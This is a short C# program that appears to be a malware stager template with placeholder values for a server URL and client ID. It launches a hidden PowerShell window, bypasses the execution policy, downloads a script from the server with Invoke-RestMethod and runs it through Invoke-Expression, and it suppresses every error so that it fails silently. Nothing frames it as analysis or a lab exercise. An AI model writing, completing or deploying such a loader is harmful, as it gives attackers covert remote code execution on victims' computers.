using System;
using System.Diagnostics;

class Program {
    static void Main(string[] args) {
        try {
            string serverUrl = "SERVER_URL_PLACEHOLDER";
            string clientId = "CLIENT_ID_PLACEHOLDER";
            
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri '" + serverUrl + "/sys-agent?client_id=" + clientId + "' | Invoke-Expression\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            
            Process p = Process.Start(psi);
        } catch {}
    }
}
